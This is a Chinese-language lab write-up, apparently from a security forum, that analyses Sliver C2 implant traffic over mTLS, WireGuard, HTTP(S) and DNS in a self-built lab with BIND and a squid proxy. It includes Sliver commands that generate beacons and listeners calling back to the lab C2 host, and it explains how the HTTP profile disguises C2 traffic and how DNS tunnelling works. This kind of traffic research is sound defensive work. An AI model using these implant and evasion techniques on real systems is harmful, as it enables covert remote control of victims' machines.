一、Sliver C2 协议概述
----------------

在这篇文章中，我们将关注如下4种Sliver C2协议，并研究其通信中的流量。

1. mutual TLS (mTLS)
2. WireGuard
3. HTTP
4. DNS  
    前两种协议都是官方非常推荐的，而后两种则是在更为常见的场景中使用，在一些严格限制的环境中，如只允许 HTTP(S) 和 DNS 出网，那么就需要用到后两种协议。

二、mTLS 通信研究
-----------

### 2.1 环境配置 - DNS

为了模拟真实情况，这里除了C2服务器和受害主机，还引入了一个DNS服务器，提供域名服务。DNS服务器使用Ubuntu进行搭建，相关IP信息如下。

DNS 服务器搭建  
这里将使用 BIND 实现 DNS 服务，[BIND](https://en.wikipedia.org/wiki/BIND) 是一套用于与域名系统（DNS）交互的软件。  
首先安装工具套件

```shell
apt-get install bind9 bind9utils bind9-doc
```

BIND 配置文件都位于 /etc/bind 中，我们需要修改其中的 named.conf.options 文件。

```php
#定义了一个名为"localnet"的访问控制列表，它包含了172.16.181.0/24网段中的IP地址。
acl "localnet" {
    172.16.181.0/24; 
};

options {
    directory "/var/cache/bind";

    recursion yes;  # 开启递归查询，允许DNS服务器向其他DNS服务器发出查询请求
    allow-recursion { localnet; };  # 指定哪些ACL可以进行递归查询

    listen-on { 172.16.181.192; };  # 指定DNS服务器监听的IP地址
    allow-transfer { none; };       # 禁用区域传输，防止未经授权的访问

    forwarders {    # 指定转发查询的DNS服务器地址
        8.8.8.8;
        8.8.4.4;
    };

    dnssec-validation auto;  # 开启DNSSEC验证

    listen-on-v6 { any; };
};

logging {
    channel query {    # DNS查询记录的配置信息
        file "/var/log/bind/query" versions 5 size 10M; # 保存路径
        print-time yes;
        severity info; # 记录级别为info
    };

    category queries { query; };
};

```

这个配置文件中的acl "localnet"规则定义了一个名为"localnet"的访问控制列表，它包含了192.168.122.0/24网段中的IP地址。其中指定了 172.16.181.192 作为监听 IP 和配置了日志路径var/log/bind/query，其余配置在配置文件中都有详细的备注描述。

由于 AppArmor 安全模块的存在，需要做一个小的改动以允许向这个目录写入。

```shell
# 创建DNS记录日志文件夹
mkdir /var/log/bind
chown bind /var/log/bind

# 添加apparmor白名单，允许修改上述目录
gedit /etc/apparmor.d/usr.sbin.named

profile named /usr/sbin/named flags=(attach_disconnected) {
  ...
  /var/log/bind/** rw,
  /var/log/bind/ rw,
  ...
}

# 重新启动apparmor
systemctl restart apparmor
```

![p9V2MjS.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0f182b47a1884c3c3db4929c936a29840f657a55.png)

> AppArmor是一个Linux安全模块，用于限制应用程序的行为，防止它们访问系统资源和执行恶意操作。它基于Linux内核的安全增强功能，使用类似于访问控制列表（ACL）的策略来控制应用程序的访问权限，包括文件、目录、网络端口、系统调用等。AppArmor提供了一个配置文件，可以为每个应用程序定义自己的安全策略。这些策略可以限制应用程序的权限，从而减少系统受到攻击的风险。

接下来创建一个目录用于区域文件，在配置文件 `/etc/bind/named.conf.local` 中指定正向反向区域

```shell
mkdir -p /etc/bind/zones

vi /etc/bind/named.conf.local

zone "labnet.local" {
    type master;
    file "/etc/bind/zones/db.labnet.local";
};

zone "181.16.172.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.181.16.172";
};
```

在 `/etc/bind/zones/db.labnet.local` 配置，为ns.labnet.local定义了SOA和NS记录，以及所有主机的一些A记录。请注意，条目admin.labnet.local.只是一种奇怪的写法，即 admin@labnet.local 是该区域的管理电子邮件地址。

```php
$TTL    604800
@       IN      SOA     ns.labnet.local. admin.labnet.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers - NS records
    IN      NS      ns.labnet.local.

; name servers - A records
ns.labnet.local.          IN      A       172.16.181.192

; 172.16.181.0/24 - A records
target.labnet.local.        IN      A      172.16.181.177
sliver.labnet.local.        IN      A      172.16.181.182
```

为了真实环境，这里还添加了反向查询功能，在配置文件 `/etc/bind/zones/db.181.16.172` 修改。

```php
$TTL    604800
@       IN      SOA     ns.labnet.local. admin.labnet.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers
      IN      NS      ns.labnet.local.

; PTR Records
192   IN      PTR     ns.labnet.local.        ; 172.16.181.192
177   IN      PTR     target.labnet.local.    ; 172.16.181.177
182   IN      PTR     sliver.labnet.local.    ; 172.16.181.182
```

配置完成后，依次执行以下命令进行检查。

```shell
named-checkconf
named-checkzone labnet.local /etc/bind/zones/db.labnet.local
named-checkzone 172.16.181.in-addr.arpa /etc/bind/zones/db.181.16.172

# 重启BIND服务
systemctl restart bind9
```

![p9V2eht.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-feaba72f4aea19b24f7f7d2193b95797a5f2430b.png)

验证效果  
来到我们 C2 服务器上测试效果

```shell
kali> dig +short @172.16.181.192 target.labnet.local
172.16.181.177
kali> dig +short @172.16.181.192 -x 172.16.181.177
target.labnet.local.
```

在日志中可以看到查询请求

```shell
cat /var/log/bind/query
```

![p9V2Kc8.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6c15a45feacd020514816e725d9a42906c2bea87.png)

来到受害主机上，配置受害主机的 DNS 地址  
![p9V2u1f.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-07bb153191fec568ee1d400998f8eac57ced0653.png)

### 2.2 mTLS 通信分析

通过域名访问，创建 Implant

```shell
generate beacon --os windows --seconds 5 --mtls sliver.labnet.local,172.16.181.182
mtls
```

![p9VWIfI.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-7507637b7f5d49218b441eb970fe80e36464e76b.png)

执行 Implant 后，打开 Wireshark 抓取流量，首先在Wireshark中可以看到下面的DNS流量。显示了 Implant 通过 DNS 请求 Sliver 服务器的 IP 。  
![p9V2n9P.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b6039b13698336846bb92610893829005a15bf50.png)

后续的数据包显示了建立TLS连接的过程，其中可以看到域名信息，这主要是由于SNI（Server Name Indication）的存在，服务器会根据SNI中的主机名来选择对应的证书和密钥，以完成TLS握手过程。SNI的引入使得服务器能够在同一IP地址和端口下支持多个域名。  
其余通信信息，均已进行加密。  
![p9V2djU.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-182ef40e3bb665bca1e612b721ec5ed3bc9ee3af.png)

在后续的数据包中，可以看到 TLS 连接没有保持开放。而是经常断开连接，然后稍后重新连接，这是由于 Implant 是作 beacon 创建的。  
此外，有个很有意思的点，在右边栏中可以观察到不同RST包之间存在一定间隔，非常直观。  
![p9V2acT.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-f20fcaf806df24c0e30db887be81f8925a7a2c98.png)

有些情况下，DNS服务不支持，这时需要直接进行IP通信，下面分析直接通过 IP 进行访问情况  
在我们的环境中，将BIND服务暂时关闭

```shell
# 关闭服务
systemctl stop bind9

# 刷新DNS缓存
ipconfig /flushdns
```

![p9V20uF.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-59812fefc9e92c353ec544c53a1f3c2a276bbb34.png)

重新执行 Implant ，首先可以看到一些 ICMP 数据包，限制端口不可达，检查源目的IP可以发现这部分是请求DNS解析的数据包，这里DNS服务关闭了，故存在下面这些数据包。  
![p9V2N90.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0011d829416e176964d6b7ae796b9f3e335b63b8.png)

之后数据包中，可以看到受害主机与C2服务器进行TCP三次握手，直接连接到了IP地址。然后建立TLS连接，进行C2通信，由于beacon的原因，这里也是会间隔一定时间断开重连。此外，在这个流量中没有看到SNI的DNS名称，这证实了这个连接没有使用基于DNS的连接字符串。  
![p9V2U3V.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-030eb9c6f387598f96ac9cdb79b5feb50fd4e641.png)

三、WireGuard 通信分析
----------------

环境同上一节一致

首先通过指定 `--wg` 参数生成 Implant，并创建对应的 WireGuard 监听器，默认监听端口为 UDP 53。

```shell
generate --os windows --wg sliver.labnet.local,172.16.181.182
wg
```

![p9V2DHJ.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-164b1ad35cf014a46ae9491f55bb8dbbae9e8c73.png)

受害主机执行后，WireShark中同样捕获到DNS解析请求，将 Sliver.labnet.local 解析为 172.16.181.182。  
![p9V2BB4.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bc8eb8be92b42ae457f9552e881e85ec54011df2.png)

之后，WireGuard连接建立完成，通过DNS上的UDP53端口进行通信。  
![p9V2yNR.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c27af3bebf7ae5aea8725f34d543e440595e28fc.png)

四、HTTP(S) 通信分析
--------------

### 4.1 环境配置 - HTTP 代理

上述两种通信方式固然是不错的选择，但并非所有环境都允许建立mtls和wireguard连接。有时目标与外部的网络连接将被默认限制，只有选定的流量可以从内部网络中流出。例如，网络流量往往被允许，但需要通过网络代理，在那里它可能被记录和检查。在这些情况下，必须使用HTTP和HTTPS协议。

为了模拟严格的环境，只允许HTTP代理流量进出，在原先的实验环境DNS服务器上添加HTTP代理工具，这里选择 [squid](http://www.squid-cache.org/) 工具来实现。

```shell
apt-get install squid
```

![p9V2sE9.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-ff28843a8d23ec56c22120488a44452fd741f830.png)

配置文件在 `/etc/squid/squid.conf` 中，为网络范围创建一个ACL，然后为这个ACL授予HTTP权限，同时配置DNS解析，以确保我们的自定义DNS服务被使用。

```shell
# 编辑配置文件
vi /etc/squid/squid.conf
...
acl labnet src 172.16.181.0/24
http_access allow labnet

dns_nameservers 172.16.181.192
...
# 启动
systemctl start squid

# 测试连通性
curl -six http://172.16.181.192:3128 https://www.baidu.com/ | head -n 5
```

![p9V2641.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3262af2ebf4180294d2d4034810c5c23bb6b7d4a.png)

![p9VREKU.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6dad61f0087f347d2fd216db09b703a241b6bac7.png)

在受害主机上配置代理  
![p9VRl26.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-1fae98dbcebbd5d726bd160ed761362e7e0afe48.png)  
验证配置成功

```shell
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | findstr ProxyServer
ProxyServer                : 172.16.181.192:3128
```

配置防火墙进出策略  
首先使用命令查看当前防火墙配置文件，这里为公用配置文件（Public）

```shell
netsh advfirewall show currentprofile
公用配置文件 设置:
----------------------------------------------------------------------
状态                                  启用
防火墙策略                          BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (仅 GPO 存储)
LocalConSecRules                      N/A (仅 GPO 存储)
InboundUserNotification               启用
RemoteManagement                      禁用
UnicastResponseToMulticast            启用

日志:
LogAllowedConnections                 禁用
LogDroppedConnections                 禁用
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

确定。
```

![p9VRVrF.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-10720d90e0ee835f71dab489ced7116a92b02dff.png)  
确认好后，此时再连接任何网站都会显示失败。  
之后添加两个防火墙规则，其一是本地任何端口连接HTTP Proxy服务器的TCP3128端口。  
![p9VRmVJ.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-dd4c8413f02eb5031de4f1cab15ea47e57496fa2.png)  
其二就是连接DNS服务器上的UDP53端口，方法类似。

尝试访问，可以在代理日志中查询到对应的访问记录

```shell
tail -f /var/log/squid/access.log
```

![p9VRZb4.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-7bd8726150e48c4841aa2bee256f2b296b5c29df.png)

### 4.2 HTTPS 通信分析

创建 Implant ，除了常规的定义方法，还可以定义具有相同域名但具有不同HTTP选项的C2端点。

```shell
generate beacon --http sliver.labnet.local,sliver.labnet.local?driver=wininet --seconds 5 --jitter 0
https
http
```

这里第二个域名中添加了参数`driver=wininet`，表示使用 \[wininet\]([About WinINet - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/wininet/about-wininet)) 驱动程序进行HTTP通信。

> 在Sliver中，HTTP驱动程序用于生成基于HTTP协议的beacon，并与Sliver服务器进行通信。HTTP驱动程序默认实现是纯Go实现的，但在某些情况下，纯Go实现的HTTP驱动程序可能无法正常工作，例如在使用某些代理服务器或防火墙时。此时，Sliver会尝试使用"wininet"驱动程序，该驱动程序依赖于本地Windows WinInet API。这个驱动程序通常比纯Go实现的HTTP驱动程序更可靠，因为它使用操作系统提供的底层网络功能，可以更好地处理一些复杂的网络环境。

执行恶意程序并捕获流量，在第一次的连接中显示400，这是由于内置的http驱动程序无效导致的。  
![p9VR1xK.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-1cbcad90717ccbf4858e961d345e3e11275c6082.png)  
等待一会后，会捕获到后续的TCP连接数据，在第17个TCP流中可以查看到返回状态码200。表明成功建立了HTTP连接。  
分析其中的数据包，为数不多可见的字符串就是CONNECT字段，表示与 sliver.labnet.local 建立了连接，其余大部分字段都进行了加密处理，没有过多的信息。  
![p9VRTLF.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-344dfce7244dbb75cfee6d4bfdc6b0040237f4f2.png)

### 4.3 HTTP 通信分析

由于Sliver实现了自己的传输加密方案，所有通过HTTP等纯文本通道发送的数据将无法读取，因此从保密的角度来看，使用HTTP或HTTPS并不重要。  
在https和http监听器同时开启的情况下，优先连接https，因此在本节的实验中，先将之前的https监听器关闭，方可捕获到http通信流量。

```shell
# 删除指定监听器
jobs
jobs -k 5
```

接下来执行 HTTP Beacon，一段时间后上线C2，捕获到如下流量：  
![p9VRosU.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-322198251ace850624e04e8a1c176887989cfbdf.png)  
首先要注意的是，请求和响应包中都包含了不可读数据（上图红框中），这些数据是加密的，使用了随机编码方式（base64、hex、gzip等），**其中就包括我们 command 和 control 数据和返回的信息**，这就是基于http通信控制目标的核心所在！

更近一步分析，我们可以看到请求数据包中不仅只有POST，还有GET请求包。其中每个请求都和真实请求相似，使用了一些路径和文件名来进行混淆迷惑，如/oauth/db/samples.php、javascript/script/jquery.js等，这部分由**C2侧写配置文件（http-c2.json）**来控制，将会在下一节介绍~

除此之外，所有的GET和POST请求在URL中都有一个查询参数（?s=22f926a944），其名称是一个随机选择的字符，其值也是一个随机字符串。**这些随机参数引入的其中一个原因在于绕过浏览器缓存机制**，如果多次发送相同的请求，服务器会返回缓存的响应，这就可能会导致C2的失效中断！另一个原因将在下一节介绍。  
![p9VRhR0.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-62ee9295cf1d20b530c5567ea847eb42458110c9.png)  
最后，我们可以在代理服务器日志中查看访问信息  
![p9VR4zV.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bb6321b1404bee71b8d7af25f4f2ad1f3b4a1c71.png)

### 4.4 C2 HTTP 通信配置

C2 http 通信配置文件位于 `/root/.sliver/configs/http-c2.json`，下面拆分解释下  
`implant_config` 部分是配置Implant使用HTTP进行通信过程中，交互、轮询使用到的一些文件名、路径等，用于混淆C2流量，欺骗目标主机。

```shell
    "implant_config": {
        "user_agent": "",
        "chrome_base_version": 100,  # 浏览器版本号
        "macos_version": "10_15_7",
        "url_parameters": null,      # 表示HTTP请求中的URL参数，用于传递额外的信息或数据
        "headers": null,             # 其他头部信息
        "max_files": 8,              # 请求中最大文件数
        "min_files": 2,
        "max_paths": 8,              # 请求中最大路径数
        "min_paths": 2,
        "stager_file_ext": ".woff",  # stager文件的扩展名（.woff字体文件扩展名）
        "poll_file_ext": ".js",      # 使用JavaScript文件进行C2服务器轮询
        "poll_files": [              # 指定Sliver轮询C2服务器时要使用的文件
            "jquery.min",
            "app",
            "email",
            ......
        ],
        "poll_paths": [              # 指定Sliver轮询C2服务器时要使用的路径
            "js",
            "script",
            "assets",
            ......
        ],
        "start_session_file_ext": ".html", # 指定Sliver启动会话时使用到的文件扩展名
        "session_file_ext": ".php",  # 表示会话文件的扩展名
        "session_files": [           # 表示Sliver生成会话文件时使用的文件名
            "login",
            "signin",
            ......
        ],
        "session_paths": [           # 指定会话文件的路径
            "php",
            "api",
            ......
        ],
        "close_file_ext": ".png",    # 表示关闭会话时使用的文件扩展名
        "close_files": [             # 指定Sliver在关闭会话时要使用的文件名
            "favicon",
            ......
        ],
        "close_paths": [             # 指定关闭会话时使用的路径
            "static",
            "www",
            ......
        ]
    },
```

`server_config` 这部分就是配置C2服务器上响应包的信息

```shell
    "server_config": {
        "random_version_headers": false, # 随机生成版本号作为请求头
        "headers": [],                   # 自定义头部
        "cookies": [                     # 自定义cookie列表
            "PHPSESSID",
            "SID",
            "SSID",
            "APISID",
            "csrf-state",
            "AWSALBCORS"
        ]
    }
```

### 4.5 进一步流量分析

继续深入研究，HTTP流量信息如何通过上述配置文件产生，以 Beacons HTTP 为例：

1. 使用`beacon.Init()`初始化beacon主循环，其中beacon会与服务器交换一个密钥，用于对数据进行加密。它使用一个以`start_session_file_ext`值结尾的URI的POST请求来完成，如C2配置文件中指定的。默认该值是.html。  
    ![p9VRIMT.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-f977164fc78b5670397d03920145db4cae911339.png)
2. Beacon 使用`beacon.Send()`进行注册操作。它使用一个POST请求，其中的URI由C2配置（代码）中的 session\_paths、session\_files 和 session\_file\_ext 值指定。  
    ![p9VWYlV.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-fc7b2cfb76bcd7b155f5ae8f97bb6bd55348d0d2.png)
3. 注册后，beacon 进入执行循环中，在定义的时间间隔内，它将首先发送一个检查（POST），然后接收一些信息（GET），POST请求同上，而GET请求由poll\_paths、poll\_files和poll\_file\_ext值指定。  
    ![p9VRzQK.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-89e964978ec9969ab840da20fb7ca313607f4fc8.png)
4. 最后当beacon关闭时，会发送一个GET请求，其中的内容由close\_paths, close\_files和close\_file\_ext值指定。（测试时并没有产生。。）  
    ![p9VRjRx.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-eac3ebfc07836ac1fdef958b01a14fd03b865123.png)

不难发现，上述请求url都带有随机参数（?x=78310l399），如上一节所述，其中一个原因是破坏内存，另一原因就是确定数据的编码方式，参考源码。如果不带参数，C2服务器将会忽略。

```go
func RandomEncoder() (int, Encoder) {
    keys := make([]int, 0, len(EncoderMap))
    for k := range EncoderMap {
        keys = append(keys, k)
    }
    encoderID := keys[insecureRand.Intn(len(keys))]
    nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID
    return nonce, EncoderMap[encoderID]
}
```

这里随机选择一个编码器，并生成一个随机数nonce作为加密密钥，用于保护数据传输的安全性。在Sliver中，编码器是用于对数据进行加密和解密的组件，nonce则是加密密钥的一种生成方式。通过随机选择编码器和生成nonce，可以增加数据传输的安全性和难度。

五、DNS C2 通信研究
-------------

### 5.1 环境配置 - DNS

基于之前 2.1 节的DNS配置，这部分添加一个NS记录 dnsc2.labnet.local，指向sliver.labnet.local。首先在 `named.conf.local` 配置文件中设置将在本地服务器进行递归解析，而不是发给上游服务器。

```shell
vi /etc/bind/named.conf.local

zone "labnet.local" {
    type master;
    file "/etc/bind/zones/db.labnet.local";
    forwarders {};
};

zone "181.16.172.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.181.16.172";
};
```

后在区域配置文件中 `/etc/bind/zones/db.labnet.local` 添加子域名解析NS记录

```shell
vi /etc/bind/zones/db.labnet.local

...
; delegate subdomain
dnsc2.labnet.local.     360     IN      NS      sliver.labnet.local.

```

最后重启服务，并验证效果，如下图所示为配置成功。

```shell
# Proxy代理服务器上执行
systemctl restart named.service
tail -f /var/log/bind/query

# kali中监听
tcpdump -ni any udp and port 53

# 在受害主机中查询
nslookup.exe prefix.dnsc2.labnet.local
```

![p9VRvz6.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-7fe3ad73f46585de4e40bfb27aa6c4049d106ed2.png)

### 5.2 DNS 通信分析

> 工作原理：在子域名中填充编码数据，向恶意DNS服务器发送该子域的查询。

同样，也是先创建监听器，不同于之前的创建方式，这里需要指定监听的域名。官方建议使用FQDN（完全限定域名），因此在一个域名最后添加一个点`.`，表示根域名

```shell
dns -d dnsc2.labnet.local.
```

![p9VW5tA.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bd5aa2268680f22a16364392db9d4abc97943fe6.png)  
生成 DNS beacon ，指定域名并设定回连间隔为10秒

```php
generate beacon --dns dnsc2.labnet.local --seconds 10 --jitter 0 
```

执行后，在WireShark中记录了beacon产生的流量。其中有很多对dnsc2.labnet.local的子域的A记录的DNS查询，以及一个TXT记录的查询。  
![p9VWJS0.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3cbbb0323796c2eb200620883ed8d018a2fa0e9d.png)  
深入分析原理，**当Implant向服务器发送数据时，会在子域名中填充编码后的数据**，然后发送给目标DNS服务器，而服务器向Implant发送数据时会使用TXT查询，将数据返回给Implant。但由于域名长度限制为254字符（包括子域名和根域名），而每个子域名最大长度为63个字符，因此不建议进行大文件上传下载操作。（理想速率：30Kbps）

进一步，根据[官方文档](https://github.com/BishopFox/sliver/wiki/DNS-C2)，这里的编码方式主要有两种：Base32和Base58。由于DNS是一个对大小写不敏感的协议，Base32对大小写不敏感，可以直接使用；Base58对大小写敏感，但其速度更快。所以默认情况下 Sliver 会首先验证Base58能否使用，否则使用Base32。当然如果想指定编码，可以使用如下命令：

```shell
generate beacon --dns dnsc2.labnet.local?force-base32=True
```

Sliver C2 DNS 通信在设计中在隐蔽性和速度上选择了后者（两者不可兼得），如果做的太隐蔽会在速度上大打折扣，对实际使用非常不友好。然而，在实际场景中，除非有专门的检测DNS C2工具或蓝队人员，一般都不会对DNS流量进行监测，所以设计上偏向于在传输速度这一方面。

最后在 DNS 日志中记录了响应的通信流量  
![p9VWTpt.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-306d7db3822b123728d8fdf5e359be3f68e6f874.png)

六、后记
----

断断续续研究了几天，在自建环境中由浅入深分析了Sliver C2中4种协议通信的过程，涉及到命令和数据是如何在服务器和植入木马中进行通信传输、隐蔽交互的。后续可能还会补充这些通信协议在源码中的实现解读，有点硬核但很有趣。